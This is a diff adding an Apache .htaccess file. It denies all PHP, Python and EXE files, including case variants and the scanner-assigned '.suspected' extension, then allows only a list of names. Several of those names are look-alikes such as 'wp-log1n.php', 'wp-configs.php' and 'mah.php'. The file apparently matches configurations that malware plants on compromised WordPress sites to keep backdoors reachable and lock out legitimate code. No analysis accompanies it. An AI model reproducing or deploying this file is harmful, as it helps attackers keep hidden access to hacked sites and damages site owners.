@@ -1,0 +1,17 @@
+DirectoryIndex index.php index.html
+<FilesMatch '.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch '^(goods.php|buy.php|special.php|click.php|edit.php|pages.php|product.php|shop.php|item.php|search.php|brand.php|wp-configs.php|install.php|plugin.php|plugins.php|admin.php|index.php|wp-login.php|wp-log1n.php|about.php|defaults.php|function.php|mah.php|networks.php|options.php|amp.php|wp-admin.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
